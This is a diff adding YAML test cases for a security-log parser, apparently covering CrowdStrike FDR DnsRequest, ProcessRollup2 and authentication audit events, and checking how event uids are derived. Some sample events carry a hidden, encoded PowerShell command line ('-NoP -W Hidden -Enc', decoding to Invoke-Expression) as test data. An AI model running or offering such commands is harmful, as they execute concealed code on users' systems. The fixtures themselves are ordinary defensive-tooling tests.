+  - raw: "{\"aid\":\"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\",\"cid\":\"ffeeddccbbaa99887766554433221100\",\"aip\":\"203.0.113.44\",\"ComputerName\":\"WKS-EDR-01\",\"event_platform\":\"Win\",\"ConfigBuild\":\"1007.3.0016606.11\",\"timestamp\":\"1787043600000\",\"event_simpleName\":\"ProcessRollup2\",\"ContextTimeStamp\":\"1787043600.451\",\"ImageFileName\":\"\\\\Device\\\\HarddiskVolume2\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"CommandLine\":\"powershell.exe -NoP -W Hidden -Enc SQBFAFgA\",\"RawProcessId\":\"4812\",\"TargetProcessId\":\"128472361926\",\"ParentProcessId\":\"128472361100\",\"ParentBaseFileName\":\"explorer.exe\",\"SHA256HashData\":\"9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f\",\"MD5HashData\":\"7353f60b1739074eb17c5f4dddefe239\",\"SHA1HashData\":\"0000000000000000000000000000000000000000\",\"UserSid\":\"S-1-5-21-1004336348-1177238915-682003330-1001\",\"AuthenticationId\":\"999123\",\"IntegrityLevel\":\"12288\",\"TokenType\":\"1\",\"ProcessStartTime\":\"1787043600.451\",\"ProcessGroupId\":\"128472361926\",\"id\":\"ffffffff-1111-11eb-8dd4-061759968cdf\"}"
+    expect:
+      "metadata.original_event_uid": "ffffffff-1111-11eb-8dd4-061759968cdf"
+  # NAN-3718: an FDR record without `id` has no native id
+  - raw: "{\"aid\": \"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\", \"cid\": \"ffeeddccbbaa99887766554433221100\", \"aip\": \"203.0.113.44\", \"ComputerName\": \"WKS-EDR-01\", \"event_platform\": \"Win\", \"ConfigBuild\": \"1007.3.0016606.11\", \"timestamp\": \"1787043600000\", \"event_simpleName\": \"ProcessRollup2\", \"ContextTimeStamp\": \"1787043600.451\", \"ImageFileName\": \"\\\\Device\\\\HarddiskVolume2\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"CommandLine\": \"powershell.exe -NoP -W Hidden -Enc SQBFAFgA\", \"RawProcessId\": \"4812\", \"TargetProcessId\": \"128472361926\", \"ParentProcessId\": \"128472361100\", \"ParentBaseFileName\": \"explorer.exe\", \"SHA256HashData\": \"9f914d42706fe215501044acd85a32d58aaef1419d404fddfa5d3b48f66ccd9f\", \"MD5HashData\": \"7353f60b1739074eb17c5f4dddefe239\", \"SHA1HashData\": \"0000000000000000000000000000000000000000\", \"UserSid\": \"S-1-5-21-1004336348-1177238915-682003330-1001\", \"AuthenticationId\": \"999123\", \"IntegrityLevel\": \"12288\", \"TokenType\": \"1\", \"ProcessStartTime\": \"1787043600.451\", \"ProcessGroupId\": \"128472361926\"}"
+    expect:
+      "metadata.original_event_uid": "<missing>"
+  # NAN-3718: a streaming audit event carries no per-event id
+  - raw: "{\"metadata\": {\"customerIDHash\": \"ffeeddcc\", \"offset\": 42318, \"eventType\": \"AuthActivityAuditEvent\", \"eventCreationTime\": 1787044080000, \"version\": \"1.0\"}, \"event\": {\"UserId\": \"soc.analyst@corp.example\", \"UserIp\": \"198.51.100.20\", \"OperationName\": \"userAuthenticate\", \"ServiceName\": \"CrowdStrike Authentication\", \"Success\": \"true\", \"UTCTimestamp\": \"2026-08-18T12:01:20Z\"}}"
+    expect:
+      "metadata.original_event_uid": "<missing>"
+  # NAN-3721: an FDR record without `id`: the raw record is hashed (no aid+event+ms composite)
+  - raw: "{\"aid\":\"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\",\"cid\":\"ffeeddccbbaa99887766554433221100\",\"aip\":\"203.0.113.44\",\"ComputerName\":\"WKS-EDR-01\",\"event_platform\":\"Win\",\"ConfigBuild\":\"1007.3.0016606.11\",\"timestamp\":\"1787043600000\",\"event_simpleName\":\"DnsRequest\",\"ContextTimeStamp\":\"1787043960.5\",\"DomainName\":\"a.example.com\",\"RequestType\":\"1\",\"IP4Records\":\"93.184.216.34;93.184.216.35;\",\"FirstIP4Record\":\"93.184.216.34\",\"QueryStatus\":\"0\",\"DnsRequestCount\":\"1\",\"ContextProcessId\":\"128472361926\"}"
+    expect:
+      "metadata.uid": "e02cd2915b3f335898915a4001a0353d3fbc4a624d56b915d8d0abfaf0657245"
+  # NAN-3721: a second DnsRequest from the same host in the same millisecond: a distinct uid, so it is not dropped
+  - raw: "{\"aid\":\"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\",\"cid\":\"ffeeddccbbaa99887766554433221100\",\"aip\":\"203.0.113.44\",\"ComputerName\":\"WKS-EDR-01\",\"event_platform\":\"Win\",\"ConfigBuild\":\"1007.3.0016606.11\",\"timestamp\":\"1787043600000\",\"event_simpleName\":\"DnsRequest\",\"ContextTimeStamp\":\"1787043960.5\",\"DomainName\":\"b.example.com\",\"RequestType\":\"1\",\"IP4Records\":\"93.184.216.34;93.184.216.35;\",\"FirstIP4Record\":\"93.184.216.34\",\"QueryStatus\":\"0\",\"DnsRequestCount\":\"1\",\"ContextProcessId\":\"128472361926\"}"
+    expect:
+      "metadata.uid": "2c6b4a86c74637bacfc2ef3bc70c486efcefbb668598c931f1a16893bac7bdad"
+  # NAN-3721: an FDR record's per-event `id` is the uid
+  - raw: "{\"aid\":\"1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d\",\"cid\":\"ffeeddccbbaa99887766554433221100\",\"aip\":\"203.0.113.44\",\"ComputerName\":\"WKS-EDR-01\",\"event_platform\":\"Win\",\"ConfigBuild\":\"1007.3.0016606.11\",\"timestamp\":\"1787043600000\",\"event_simpleName\":\"DnsRequest\",\"ContextTimeStamp\":\"1787043960.5\",\"DomainName\":\"malicious.example.com\",\"RequestType\":\"1\",\"IP4Records\":\"93.184.216.34;93.184.216.35;\",\"FirstIP4Record\":\"93.184.216.34\",\"QueryStatus\":\"0\",\"DnsRequestCount\":\"1\",\"ContextProcessId\":\"128472361926\",\"id\":\"ffffffff-1111-11eb-9d75-02bcf3ade03b\"}"
+    expect:
+      "metadata.uid": "ffffffff-1111-11eb-9d75-02bcf3ade03b"
+      "metadata.original_event_uid": "ffffffff-1111-11eb-9d75-02bcf3ade03b"
